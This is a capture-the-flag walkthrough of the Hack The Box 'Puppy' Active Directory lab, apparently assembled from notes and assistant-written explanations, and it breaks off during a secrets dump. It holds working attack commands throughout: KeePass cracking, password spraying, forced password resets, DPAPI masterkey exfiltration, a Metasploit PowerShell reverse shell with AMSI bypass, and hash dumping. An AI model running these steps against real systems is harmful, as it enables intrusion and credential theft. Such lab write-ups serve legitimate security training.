# Machine Information

As is common in real-world penetration tests, you begin the **Puppy** assessment with valid credentials for a standard user account.

## Starting Credentials

- **Username:** `levi.james`
- **Password:** `KingofAkron2025!`

These credentials simulate an attacker with access to a compromised low-privilege account. The objective is to escalate privileges and further compromise the environment.

## Nmap Scan

**Command Used:**
```bash
sudo nmap -Pn -T5 -sV -A 10.10.11.70 -oX nmap/output
```

**Scan Date:** 2025-07-01  
**Target:** `puppy.htb (10.10.11.70)`  
**Latency:** 0.079s  
**Filtered Ports:** 985 TCP ports (no-response)

---

### Open Ports and Services

| Port     | State | Service         | Version/Notes                                         |
|----------|-------|-----------------|-------------------------------------------------------|
| 53/tcp   | open  | domain          | Simple DNS Plus                                       |
| 88/tcp   | open  | kerberos-sec    | Microsoft Windows Kerberos                            |
| 111/tcp  | open  | rpcbind         | 2-4 (RPC #100000) (see rpcinfo below)                 |
| 135/tcp  | open  | msrpc           | Microsoft Windows RPC                                 |
| 139/tcp  | open  | netbios-ssn     | Microsoft Windows netbios-ssn                         |
| 389/tcp  | open  | ldap            | Microsoft Windows Active Directory LDAP               |
| 445/tcp  | open  | microsoft-ds?   | Unknown                                               |
| 464/tcp  | open  | kpasswd5?       | Unknown                                               |
| 593/tcp  | open  | ncacn_http      | Microsoft Windows RPC over HTTP 1.0                   |
| 636/tcp  | open  | tcpwrapped      |                                                       |
| 2049/tcp | open  | nlockmgr        | 1-4 (RPC #100021)                                     |
| 3260/tcp | open  | iscsi?          |                                                       |
| 3268/tcp | open  | ldap            | Microsoft Windows Active Directory LDAP               |
| 3269/tcp | open  | tcpwrapped      |                                                       |
| 5985/tcp | open  | http            | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)               |

#### Notable rpcinfo Output for 111/tcp
```
program version    port/proto  service
100000  2,3,4      111/tcp     rpcbind
100000  2,3,4      111/tcp6    rpcbind
100000  2,3,4      111/udp     rpcbind
100000  2,3,4      111/udp6    rpcbind
100003  2,3        2049/udp    nfs
100003  2,3        2049/udp6   nfs
100005  1,2,3      2049/udp    mountd
100005  1,2,3      2049/udp6   mountd
100021  1,2,3,4    2049/tcp    nlockmgr
100021  1,2,3,4    2049/tcp6   nlockmgr
100021  1,2,3,4    2049/udp    nlockmgr
100021  1,2,3,4    2049/udp6   nlockmgr
100024  1          2049/tcp    status
100024  1          2049/tcp6   status
100024  1          2049/udp    status
100024  1          2049/udp6   status
```

---

### OS Detection

- **Likely OS:** Microsoft Windows Server 2022/2012/2016 (accuracy ~89%)
- **Device Type:** General purpose server
- **Network Distance:** 2 hops

---

### Host Script Results

- **SMB2 Security Mode:** Message signing enabled and required
- **Clock Skew:** ~7 hours fast
- **SMB2 Time:** 2025-07-02T09:14:54

---

### Traceroute (Port 135)

```
1   78.27 ms 10.10.14.1
2   78.43 ms puppy.htb (10.10.11.70)
```

---

> **Note:** OS scan results may be unreliable due to limited open/closed port info.  
> Consider submitting inaccuracies to: [nmap.org/submit](https://nmap.org/submit/)

## BloodHound Collection

**Command Used:**
```bash
faketime 'now + 7 hours' bloodhound-python -u levi.james -p 'KingofAkron2025!' -d puppy.htb -gc putty.htb -c all -ns 10.10.11.70
```

**Output Summary:**
```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.puppy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 18S
```

- **Purpose:** Performs full enumeration of the `puppy.htb` Active Directory domain using the provided credentials.
- **Notes:** Kerberos TGT acquisition failed, so NTLM authentication was used. LDAP enumeration completed successfully.

---


> **Missing screenshot:** I want to part of the group. Original: `/Images/puppy.htb/puppy-to-developers.png`. Restore to `images/puppy-to-developers.png`.


### **Command:**

```bash
faketime 'now + 7 hours' bloodyAD --host puppy.htb --dc-ip 10.10.11.70 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember 'developers' 'levi.james'
```

### **Tool Involved:**

* **`faketime`**: Temporarily alters the system time seen by the command it's wrapping. Here, it shifts the time **forward by 7 hours**.
  * Useful in bypassing time-based restrictions or testing time-sensitive behaviors (e.g., Kerberos ticket validity, AD replication delays).
* **`bloodyAD`**: Offensive Active Directory manipulation tool—similar in spirit to Impacket but focused on LDAP operations like adding/removing group members, editing ACLs, etc.

---

### **Arguments Breakdown:**

* `--host puppy.htb`: The hostname of the domain controller or target system.
* `--dc-ip 10.10.11.70`: The IP address of the Domain Controller (DC).
* `-d puppy.htb`: Domain name.
* `-u levi.james`: Username performing the operation.
* `-p 'KingofAkron2025!'`: Password for authentication.
* `add groupMember 'developers' 'levi.james'`: Action to add the user `levi.james` to the AD group named `developers`.

---

### **Outcome:**

```
[+] levi.james added to developers
```

This confirms that the command successfully added `levi.james` as a member of the `developers` group in Active Directory.

---

### **Use Case Notes:**

* **Why faketime?** Possibly to preempt or bypass time synchronization issues, e.g., making sure the user's token is valid for future time or to fool timestamp checks.
* **Why bloodyAD?** Lightweight, direct LDAP tool useful during post-exploitation or persistence phases when you have valid credentials and want to escalate privileges or modify group membership stealthily.

---


> **Missing screenshot:** Look ma' I'm a developer!. Original: `/Images/puppy.htb/puppy-to-developers.png`. Restore to `images/puppy-to-developers.png`.


---

# Enumerating SMB Shares with NetExec

## Command Used

```bash
faketime 'now + 7 hours' netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
```

###  Notes:

* **`faketime 'now + 7 hours'`**: Temporarily advances the system clock by 7 hours for this command. This can help bypass time sync issues or Kerberos-related expiration.
* **`netexec smb`**: NetExec (formerly CrackMapExec) is being used to enumerate SMB shares.
* **`puppy.htb`**: The target host, likely a Domain Controller.
* **`--shares`**: Enumerates all accessible shares for the provided credentials.

---

## Output Summary

```text
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------
SMB         10.10.11.70     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.70     445    DC               C$                              Default share
SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.10.11.70     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.70     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share 
```

---

## Key Findings

* **Valid credentials**: `levi.james` successfully authenticated.
* **Accessible shares**:

  * `DEV` – **READ** access; might contain files relevant to the `developers` group.
  * `NETLOGON`, `SYSVOL` – standard for domain controllers; good for recon or GPO abuse.
  * `IPC$` – standard for remote RPC communication.
  * `ADMIN$` and `C$` – typically only accessible with admin privileges (not usable here).

---

## Next Steps

*  **Explore the `DEV` share**:

  ```bash
  smbclient //puppy.htb/DEV -U "levi.james"
  ```

*  **Inspect `NETLOGON` and `SYSVOL`** for:

  * Logon scripts
  * GPOs
  * Credentials in plaintext

* Dump accessible files with:

  ```bash
  smbclient //puppy.htb/SYSVOL -U "levi.james" -c 'recurse; prompt OFF; mget *'
  ```

---

## SMB Share Listing – `DEV` Share

### Command:

```bash
smb: \> ls
```

---

## Output Summary:

| Name                        | Type | Size       | Last Modified            | Notes                                       |
| --------------------------- | ---- | ---------- | ------------------------ | ------------------------------------------- |
| `.`                         | DR   | 0          | Sun Mar 23 00:07:57 2025 | Current directory                           |
| `..`                        | D    | 0          | Sat Mar 8 08:52:57 2025  | Parent directory                            |
| `KeePassXC-2.7.9-Win64.msi` | A    | 34,394,112 | Sun Mar 23 00:09:12 2025 | KeePassXC installer (Windows 64-bit)        |
| `Projects`                  | D    | 0          | Sat Mar 8 08:53:36 2025  | Likely a directory containing project files |
| `recovery.kdbx`             | A    | 2,677      | Tue Mar 11 19:25:46 2025 | **KeePass database** – high value           |

---

## Notable Files

### `KeePassXC-2.7.9-Win64.msi`

* Installer for **KeePassXC**, a cross-platform password manager.
* Likely a red herring or legitimate software used by developers.

### `recovery.kdbx`

* KeePass password database file.
* **Critical Target**: May contain credentials for local, domain, or application accounts.
* Requires either:

  * Password cracking (e.g., with `keepass2john` + `john` or `hashcat`)
  * Access to master password or key file

---

## Directory: `Projects`

* May contain code, configs, or additional secrets.
* Run:

  ```bash
  smb: \> cd Projects
  smb: \Projects\> ls
  ```

---

## Next Steps

1. **Download the KeePass DB:**

   ```bash
   smb: \> get recovery.kdbx
   ```

2. **Extract KeePass hash:**

   ```bash
   $ keepass2john recovery.kdbx               
   recovery:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9
   ```
---
## Cracking KeePass with keepass4brute

```
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 65 - Estimated time remaining: 21 weeks, 6 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

---

## Exploring and Extracting Credentials from the KeePass Database

After cracking the KeePass database password, you can use `keepassxc-cli` to interactively list and extract entries.  
Below are the commands and outputs, with discovered passwords highlighted for clarity.

<details>
<summary>Show KeePass entries and passwords</summary>

```
$ keepassxc-cli open recovery.kdbx
Enter password to unlock recovery.kdbx: 
recovery> ls
JAMIE WILLIAMSON
ADAM SILVER
ANTONY C. EDWARDS
STEVE TUCKER
SAMUEL BLAKE

recovery> show --show-protected "JAMIE WILLIAMSON"
Title: JAMIE WILLIAMSON
UserName: 
Password: <span style="color:red"><b>JamieLove2025!</b></span>
URL: puppy.htb
Notes: 
Uuid: {5f112cf4-85ed-4d4d-bf0e-5e35da983367}
Tags: 

recovery> show --show-protected "ADAM SILVER"
Title: ADAM SILVER
UserName: 
Password: <span style="color:red"><b>HJKL2025!</b></span>
URL: puppy.htb
Notes: 
Uuid: {387b31a3-4a42-4352-ad9a-a42a70fa19f5}
Tags: 

recovery> show --show-protected "ANTONY C. EDWARDS"
Title: ANTONY C. EDWARDS
UserName: 
Password: <span style="color:red"><b>Antman2025!</b></span>
URL: puppy.htb
Notes: 
Uuid: {bfd9590f-b0c6-41f8-b2f5-7e6c5defa5e2}
Tags: 

recovery> show --show-protected "STEVE TUCKER"
Title: STEVE TUCKER
UserName: 
Password: <span style="color:red"><b>Steve2025!</b></span>
URL: puppy.htb
Notes: 
Uuid: {d51a238d-4fe4-4ede-bb83-e6bb6e48a0a1}
Tags: 

recovery> show --show-protected "SAMUEL BLAKE"
Title: SAMUEL BLAKE
UserName: 
Password: <span style="color:red"><b>ILY2025!</b></span>
URL: puppy.htb
Notes: 
Uuid: {d17c1358-f48b-4865-8ab6-15484dccb69b}
Tags: 
```
</details>

---

**Notes:**
- Use `show --show-protected "<ENTRY>"` to reveal protected passwords in KeePassXC CLI.
- The passwords above are now available for further enumeration, privilege escalation, or lateral movement.
- Highlighting passwords in red helps quickly identify credentials for use in subsequent attacks or testing.

---

## Enumerating All Domain Users

To obtain the full list of domain users, the following command was used:

```bash
netexec ldap 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --users | awk '{print $5}'
```

**Output:**
```
[*]
[+]
[*]
-Username-
Administrator
Guest
krbtgt
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
```

This approach leverages NetExec's LDAP enumeration to list all user accounts in the domain, which is useful for further attacks such as password spraying or privilege escalation.

---

## Password Spraying LDAP Accounts with Hydra

After collecting the list of domain users, a password spray was performed using Hydra to identify valid credentials:

```bash
hydra -L users -P passwords -m workgroup:{puppy} 10.10.11.70 smb2
```

**Output:**
```
Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-04 02:44:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 45 login tries (l:9/p:5), ~3 tries per task
[DATA] attacking smb2://10.10.11.70:445/workgroup:{puppy}
[WARNING] 10.10.11.70 might accept any credential
[445][smb2] host: 10.10.11.70   login: ant.edwards   password: Antman2025!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-04 02:44:33
```

This confirms that the credentials `ant.edwards : Antman2025!` are valid for SMB/LDAP authentication.

---

## Resetting Adam Silver's Password

The password for `adam.silver` was reset using BloodyAD:

```bash
bloodyAD --host puppy.htb --dc-ip 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'DeadSec0ps'
```

**Output:**
```
[+] Password changed successfully!
```

This command sets a new password (`DeadSec0ps`) for the `adam.silver` account, allowing access with the updated credentials.

## Adam Silver's Account is Disabled

Using the following command to investigate Adam's account:

```bash
python memberOf.py -u ant.edwards -p 'Antman2025!' --domain puppy.htb --target adam.silver
```

**Output (truncated):**
```
Investigating account: adam.silver

Login Name: adam.silver
UPN: adam.silver@PUPPY.HTB
DN: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
Common Name: Adam D. Silver
Group Memberships:
  - CN=DEVELOPERS,DC=PUPPY,DC=HTB
  - CN=Remote Management Users,CN=Builtin,DC=PUPPY,DC=HTB
...
Account Disabled: True
```

---

This confirms that the `adam.silver` account is currently **disabled** in Active Directory.

---

### `bloodyAD` Command Notes: Removing `ACCOUNTDISABLE` UAC Flag

```bash
bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u ant.edwards -p Antman2025! remove uac adam.silver -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

---

### Purpose

This command enables the user account `adam.silver` by removing the `ACCOUNTDISABLE` flag from their `userAccountControl` (UAC) attribute in Active Directory.

---

### Command Breakdown

| Argument             | Description                                             |
| -------------------- | ------------------------------------------------------- |
| `bloodyAD`           | Tool for modifying Active Directory objects via LDAP    |
| `--host 10.10.11.70` | IP address of the Domain Controller                     |
| `-d PUPPY.HTB`       | Fully Qualified Domain Name (FQDN) of the domain        |
| `-u ant.edwards`     | Username with privileges to modify AD attributes        |
| `-p Antman2025!`     | Password for the specified user                         |
| `remove uac`         | Action to remove a UAC flag from a target account       |
| `adam.silver`        | Target user whose account is being modified             |
| `-f ACCOUNTDISABLE`  | Specific UAC flag to remove (disables account when set) |

---

### About `ACCOUNTDISABLE`

* `ACCOUNTDISABLE` has a decimal value of `2` (`0x0002`).
* It indicates that a user account is disabled.
* Removing this flag will re-enable the account.

---

### Expected Result

The user account `adam.silver` is re-enabled and can be used for logon or other Active Directory operations.

---

### Notes

* The executing account must have `Write` permissions on the target user’s `userAccountControl` attribute.
* This change may require LDAP signing or encryption, depending on domain policy.
* Always verify the change by querying the updated `userAccountControl` attribute or attempting a login with the target account.

---

## Obtaining the User Flag

After resetting Adam Silver's password and enabling access, we used Evil-WinRM to log in as `adam.silver` and retrieve the user flag from the desktop:

```powershell
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> cat user.txt
bce5a1f0f0ab57eaba6ac17b0515f998
*Evil-WinRM* PS C:\Users\adam.silver\Desktop>
```

This confirms successful access to the target account and the capture of the user flag.

Here is a Markdown documentation file capturing how you discovered LDAP credentials from a backup file using Evil-WinRM:

---

# Discovery of LDAP Credentials from `site-backup-2024-12-30.zip`

## Summary

During post-exploitation enumeration on the `PUPPY.HTB` target using Evil-WinRM, a ZIP archive (`site-backup-2024-12-30.zip`) was discovered under `C:\Backups`. Upon extracting and inspecting its contents, a sensitive configuration file named `nms-auth-config.xml.bak` was found. This file contained hardcoded LDAP credentials.

---

## Step-by-Step Walkthrough

### 1. Enumeration of `C:\Backups` via Evil-WinRM

Initial enumeration of the `C:\` drive showed a `Backups` directory:

```
*Evil-WinRM* PS C:\> ls

Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
...
```

Navigated to `Backups`:

```
*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> ls

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

### 2. Download and Extract the Backup

Downloaded the file:

```powershell
download site-backup-2024-12-30.zip
```

Unzipped locally on Kali and found the following contents (as seen in Thunar):

```
assets/
images/
index.html
nms-auth-config.xml.bak
```

### 3. Credentials Found in `nms-auth-config.xml.bak`

Contents of `nms-auth-config.xml.bak` revealed hardcoded LDAP credentials:

```xml
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    ...
</ldap-config>
```

### 4. Extracted Credentials

| Field        | Value                 |
| ------------ | --------------------- |
| **Host**     | `DC.PUPPY.HTB`        |
| **Port**     | `389` (LDAP)          |
| **Base DN**  | `dc=puppy,dc=htb`     |
| **Bind DN**  | `cn=steph.cooper,...` |
| **Password** | `ChefSteph2025!`      |

These credentials can be used to bind to LDAP and enumerate or manipulate directory data, depending on privileges.

---

## Recommendation

* Investigate `steph.cooper`'s privileges in the domain.
* Attempt LDAP binding using tools like `ldapsearch`, `crackmapexec`, or `bloodyAD`.
* Check for reusability of the credentials in other services (SMB, WinRM, RDP).

---

Let me know if you'd like to convert this into a PDF report or add LDAP enumeration results.

Here are detailed Markdown notes explaining what happened in your session with `Evil-WinRM`, and what each command does:

---
# ----------------------------------NOTE THIS IS WORK IN PROGRESS! ------------------------------
# Extracting and Downloading a DPAPI Masterkey with `certutil`

## Context

We are working on extracting a **DPAPI-encrypted master key** file from a compromised Windows machine using Evil-WinRM. These keys can decrypt sensitive credential blobs stored in:

* `AppData\Roaming\Microsoft\Credentials`
* `AppData\Local\Microsoft\Credentials`
* `.rdg`, `.vnc`, `.rdp`, Chrome saved passwords, etc.

---

## Step-by-Step Commands and Explanation

### 1. Navigate to the DPAPI MasterKey Path

```powershell
cd "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect"
```

This is the default location where **user-specific DPAPI masterkeys** are stored.

---

### 2. Encode the Binary Masterkey as Base64 with `certutil`

```powershell
certutil -encode -f "S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" masterkey.blob
```

**Explanation:**

* `certutil -encode -f`: Encodes a binary file to base64.
* `"S-1-5-21-...1107\*.blob"`: The full path to the **MasterKey** file.
* `masterkey.blob`: The output filename that stores the base64-encoded version (easier to download over limited channels).

Output:

```
Input Length = 740
Output Length = 1076
CertUtil: -encode command completed successfully.
```

---

### 3. List the Directory to Confirm the File Exists

```powershell
ls
```

Expected output:

```text
-a----  7/4/2025  9:26 PM  1076  masterkey.blob
```

Confirms the `masterkey.blob` is now created and ready for download.

---

### 4. Download the MasterKey File via Evil-WinRM

```powershell
download masterkey.blob
```

Result:

```text
Info: Downloading ...
Info: Download successful!
```

The file is saved to your **local working directory** (same directory where you launched Evil-WinRM).

---

## Summary

| Step               | Purpose                                                   |
| ------------------ | --------------------------------------------------------- |
| `certutil -encode` | Convert binary MasterKey file to Base64 (easier transfer) |
| `ls`               | Verify encoded file is present                            |
| `download`         | Pull the base64 MasterKey to your Kali machine            |

---

## Next Step

On your **Kali** box, decode the blob:

```bash
awk '/^-----BEGIN/,/^-----END/ { if ($0 !~ /^-----/) print }' masterkey.blob | tr -d '\r' | base64 -d > masterkey_decoded.bin
```

---

# Analyzing the Decoded DPAPI Masterkey File

After decoding the base64-encoded masterkey blob, we performed several checks to understand its structure and confirm it is a valid DPAPI masterkey file.

## 1. Viewing the Raw Contents

```bash
cat masterkey_decoded.bin
```
This command outputs the raw binary data. The file is not human-readable, as expected for a DPAPI masterkey.

## 2. Checking the File Type

```bash
file masterkey_decoded.bin
```
**Output:**

```
masterkey_decoded.bin: data
```
This confirms the file is generic binary data, which is typical for DPAPI masterkey files.

## 3. Inspecting the File with Hexdump

```bash
hexdump -C masterkey_decoded.bin | head
```
**Sample Output:**

```
00000000  02 00 00 00 00 00 00 00  00 00 00 00 35 00 35 00  |............5.5.|
00000010  36 00 61 00 32 00 34 00  31 00 32 00 2d 00 31 00  |6.a.2.4.1.2.-.1.|
00000020  32 00 37 00 35 00 2d 00  34 00 63 00 63 00 66 00  |2.7.5.-.4.c.c.f.|
00000030  2d 00 62 00 37 00 32 00  31 00 2d 00 65 00 36 00  |-.b.7.2.1.-.e.6.|
00000040  61 00 30 00 62 00 34 00  66 00 39 00 30 00 34 00  |a.0.b.4.f.9.0.4.|
00000050  30 00 37 00 00 00 6a 55  75 12 cf 4c 00 00 00 00  |0.7...jUu..L....|
00000060  88 00 00 00 00 00 00 00  68 00 00 00 00 00 00 00  |........h.......|
00000070  00 00 00 00 00 00 00 00  74 01 00 00 00 00 00 00  |........t.......|
00000080  02 00 00 00 b2 3f 31 21  34 41 80 48 00 64 e0 2b  |.....?1!4A.H.d.+|
00000090  82 15 0b 9a 50 46 00 00  09 80 00 00 03 66 00 00  |....PF.......f..|
```
This shows the file starts with a GUID in UTF-16LE encoding, which is typical for DPAPI masterkey files. The rest of the file contains binary data used by Windows to protect and decrypt user secrets.

---

## Next Steps: Cracking or Using the Masterkey

With the binary masterkey file in hand, you can now attempt to recover the user's password or use the masterkey to decrypt DPAPI blobs. Common tools for this process include:

* `mimikatz` (on Windows)
* `gsecdump`
* `DPAPImk2john.py` (to extract a hash for John the Ripper)
* `john` (to crack the password if needed)

If you need a full workflow for DPAPI decryption or want to automate the process, let me know!

---

# Additional DPAPI Masterkey and CNG Key Extraction Notes

## Extracting and Downloading a CNG Key File

While in the DPAPI masterkey directory, we also identified and extracted another file, likely a CNG (Cryptography Next Generation) key:

```powershell
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> certutil -encode -f "29bce08f-493b-4130-bad3-7eb35b7141fa" cng.b64

Input Length = 740
Output Length = 1076
CertUtil: -encode command completed successfully.
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> download cng.b64

Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\cng.b64 to cng.b64
Info: Download successful!
```

## Listing Hidden Files in the Masterkey Directory

To see all files, including hidden and system files, we used:

```powershell
ls -hidden
```

**Sample Output:**

```
    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          7/4/2025   8:58 PM            740 29bce08f-493b-4130-bad3-7eb35b7141fa
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-          7/4/2025   8:58 PM             24 Preferred
```

## What Each File Is and Why It Matters

| Filename                                   | Purpose/Description                                                                                 |
---------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `556a2412-1275-4ccf-b721-e6a0b4f90407`     | DPAPI MasterKey file. Used to decrypt user secrets protected by DPAPI (e.g., credentials, passwords).|
| `29bce08f-493b-4130-bad3-7eb35b7141fa`     | CNG (Cryptography Next Generation) key. May be required for decrypting certain modern secrets.        |
| `Preferred`                                | Indicates which masterkey is currently preferred/active for the user profile.                        |

**Notes:**
- Both the DPAPI masterkey and CNG key are critical for decrypting protected data in the user's profile.
- The `Preferred` file is a small text file that tells Windows which masterkey GUID is currently in use.
- Extracting both the masterkey and CNG key increases your chances of successfully decrypting all user secrets, especially on newer Windows systems.


```bash
base64 -d cng.b64 > cngblob.bin
$ grep -v "CERTIFICATE" cng.b64 | tr -d '\n\r' | base64 -d > cngblob.bin

```

---

# Extra Metasploit Notes: PowerShell Web Delivery

Below are notes from using the Metasploit `web_delivery` module to obtain a reverse shell on the target via PowerShell.

## Module Setup

```
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/powershell_reverse_tcp_ssl 
payload => windows/x64/powershell_reverse_tcp_ssl
msf6 exploit(multi/script/web_delivery) > options 

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  9000             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/x64/powershell_reverse_tcp_ssl):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   EXITFUNC      process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST         10.10.14.21      yes       The listen address (an interface may be specified)
   LOAD_MODULES                   no        A list of powershell modules separated by a comma to download over the web
   LPORT         1337             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH
```

## Running the Exploit

```
msf6 exploit(multi/script/web_delivery) > exploit -j -x
[*] Exploit running as background job 5.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse SSL handler on 10.10.14.21:1337 
[*] Using URL: http://10.10.14.21:9000/XovpCcUMO260
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e <base64-encoded-payload>
[*] 10.10.11.70      web_delivery - Delivering AMSI Bypass (1377 bytes)
[*] 10.10.11.70      web_delivery - Delivering Payload (5689 bytes)
[*] Powershell session session 1 opened (10.10.14.21:1337 -> 10.10.11.70:55823) at 2025-07-05 14:47:48 -0700
```

## Explanation

- **SRVHOST/SRVPORT**: Where Metasploit listens for the target to connect and fetch the payload.
- **LHOST/LPORT**: Where the reverse shell will connect back to (your attack box).
- **Payload**: `windows/x64/powershell_reverse_tcp_ssl` delivers a 64-bit PowerShell reverse shell over SSL.
- **AMSI Bypass**: Metasploit delivers an AMSI (Antimalware Scan Interface) bypass to evade Windows Defender.
- **Base64-encoded PowerShell**: The command to run on the target is base64-encoded for stealth and reliability.

## Usage

1. Start the exploit in Metasploit.
2. Copy the provided PowerShell command and execute it on the target (e.g., via Evil-WinRM, RDP, or another method).
3. Once executed, a reverse shell session should open in Metasploit.

---

**Tip:**  
If the session does not open, check firewall rules, payload architecture, and ensure the command is run with sufficient privileges.

---


> **Missing screenshot:** Decrypting DPAPi. Original: `/Images/puppy.htb/puppy-dpapi.png`. Restore to `images/puppy-dpapi.png`.


```bash
I can not get this to work:
$ impacket-dpapi masterkey -password 'ChefSteph2025!' -file 1038bdea-4935-41a8-a224-9b3720193c86 -file ea607a17-d89b-4341-8dfb-ee499ba635d6 -sid S-1-5-21-1487982659-1829050783-2281216199-1105 

```
How to solve the challenge:

https://blog.csdn.net/qq_45203884/article/details/148264801

Learn more:
https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi-backup-keys-on-ad-domain-controllers

---

## Windows Secrets Dump with Metasploit

```
msf6 auxiliary(gather/windows_secrets_dump) > run
[*] Running module against 10.10.11.70
[!] 10.10.11.70:445 - Cannot find any active database. Extracted data will only be displayed here and NOT stored.
[*] 10.10.11.70:445 - Service RemoteRegistry is in stopped state
[*] 10.10.11.70:445 - Starting service...
[*] 10.10.11.70:445 - Retrieving target system bootKey
[+] 10.10.11.70:445 - bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
[*] 10.10.11.70:445 - Using `INLINE` technique for SAM
[*] 10.10.11.70:445 - Dumping SAM hashes
[*] 10.10.11.70:445 - Password hints:
No users with password hints on this system
[*] 10.10.11.70:445 - Password hashes (pwdump format - uid:rid:lmhash:nthash:::):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] 10.10.11.70:445 - Using `INLINE` technique for CACHE and LSA
[*] 10.10.11.70:445 - Decrypting LSA Key
[*] 10.10.11.70:445 - Dumping LSA Secrets
$MACHINE.ACC
